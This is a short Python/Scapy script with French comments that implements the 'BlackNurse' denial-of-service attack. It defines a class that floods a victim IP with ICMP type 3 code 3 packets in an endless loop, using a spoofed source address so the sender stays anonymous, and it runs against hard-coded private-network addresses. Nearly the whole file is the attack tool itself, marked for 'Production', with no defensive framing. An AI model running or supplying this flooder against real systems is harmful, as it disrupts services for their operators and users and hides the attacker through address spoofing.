from scapy.all import *
from scapy.layers.inet import IP, ICMP
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"

"""
ICMP PACKET
0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier (ID)     |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Optional Data                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""

class BlackNurseAttack:
    """
    On définis une classe BlackNurseAttack qui aura pour but:
        -d'envoyer des trames ICMP de type 3
        -de provoquer une surcharge du serveur
    """

    def __init__(self, victim_ip, spoof_ip):
        self.victim_ip = victim_ip
        self.spoof_ip = spoof_ip

    def start(self):
        """
        Méthode de classe qui aura pour but d'envoyer les trames ICMP tout en restant anonyme
        """
        packet = IP(dst=self.victim_ip, src=self.spoof_ip) / ICMP(type=3, code=3)
        sendp(packet, loop = 1, inter = 0.2)

if __name__ == "__main__":
    black_nurse = BlackNurseAttack("192.168.28.254", "192.168.28.1")
    black_nurse.start()